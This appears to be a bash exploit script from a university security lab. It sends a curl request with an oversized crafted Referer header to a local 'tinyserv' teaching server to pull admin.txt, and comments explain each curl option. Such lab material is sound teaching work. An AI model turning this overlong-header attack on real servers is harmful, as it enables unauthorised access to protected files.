#!/bin/bash

# This is just for parsing the port and management components
gitroot=$(git rev-parse --show-toplevel)
source $gitroot/lab3_port
source $gitroot/lab3_group_secret

# This shell script holds just one `curl` command
# that makes an HTTP GET request (https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods).

# Explanation of the arguments to curl, these ones are common across all curl interactions with tinyserv.

# -G means make a GET request
# -o means log to a file
# --ignore-content-length means ignore what the server says the file size is, and just keep reading data until the server stops sending
# --silent means don't show a progress bar while this all happens
# --verbose means show the headers from the request and the response (contradictory with silent, i know)
# --cookie "LAB_GROUP_SECRET_KEY=${LAB_GROUP_SECRET_KEY}" is used to authenticate your request and prevent other groups from exploiting your tinyserv instance

# These options are unique to this sploit

# --header "Referer: 111.111.111.111111.1111111.111.111.1111111.1111.111.111.111.1111111.1111.111.111.111.1111111.1111.111.111.111.1111111.1111.111.111.111.1111111.1111.111.111.111.1111111.1111.111.111.111.1111111.1111.111.111.111.1111111.1111.1111111.1111.111.111.111.1111111.1111.hack" This is an extra header we are asking curl to send as part of the HTTP GET request
# -- http://127.0.0.1:$GROUP_PORT_NO/admin.txt the "-- " here means 'no more args follow', and the rest is the URL/file we want

# Delete the previous sploit outputs
echo "" > sploit_output.txt

curl -G -o sploit_output.txt  --ignore-content-length --silent --verbose --cookie "LAB_GROUP_SECRET_KEY=${LAB_GROUP_SECRET_KEY}" --header "Referer: 111.11.111111.1111111.111.111.1111111.1111.111.111.111.1111111.1111.111.111.111.1111111.1111.111.111.111.1111111.1111.111.111.111.1111111.1111.111.111.111.1111111.1111.111.111.111.1111111.1111.111.111.111.1111111.1111.1111111.1111.111.111.111.1111111.1111.hack" -- http://127.0.0.1:$GROUP_PORT_NO/admin.txt

# For convenience, we then print what we got back from the curl command
cat sploit_output.txt
